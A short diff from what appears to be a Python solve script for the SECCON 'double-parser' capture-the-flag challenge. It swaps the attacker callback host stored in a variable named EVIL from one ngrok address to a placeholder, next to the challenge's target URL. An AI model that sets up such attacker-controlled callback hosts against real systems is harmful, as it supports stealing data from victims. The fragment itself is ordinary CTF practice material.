@@ -759,7 +759,7 @@ from urllib import parse
 
 URL = "http://double-parser.seccon.games:3000/"
 # URL = "http://localhost:3001/"
-EVIL = "https://tchenio.ngrok.io/"
+EVIL = "https://xxx.ngrok.app/"
 
 s = requests.session()
 
